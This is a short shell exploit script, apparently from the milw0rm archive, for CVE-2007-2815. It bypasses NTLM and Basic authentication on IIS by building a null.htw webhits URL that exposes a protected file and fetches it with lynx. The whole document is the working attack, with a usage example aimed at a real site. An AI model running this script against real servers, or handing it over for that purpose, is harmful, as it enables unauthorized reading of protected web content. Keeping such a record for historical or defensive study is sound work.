#!/bin/sh
#
# NTLM && BASIC AUTH BYPASS :)
#
# sha0[at]badchecksum.net
# Based on my adv: https://www.securityfocus.com/bid/24105/info   (CVE-2007-2815)

if [ $# != 2 ]
then
        printf "USAGE:\t\t$0 <Site> <Protected Object>\nExample:\t$0 http://www.microsoft.com  /en/us/default.aspx\n\n";
        exit 0
fi

site=$1
protectedObject=$2
evil=$site'/shao/null.htw?CiWebhitsfile='$protectedObject'&CiRestriction=b&CiHiliteType=full'
lynx -dump $evil

# milw0rm.com [2007-05-31]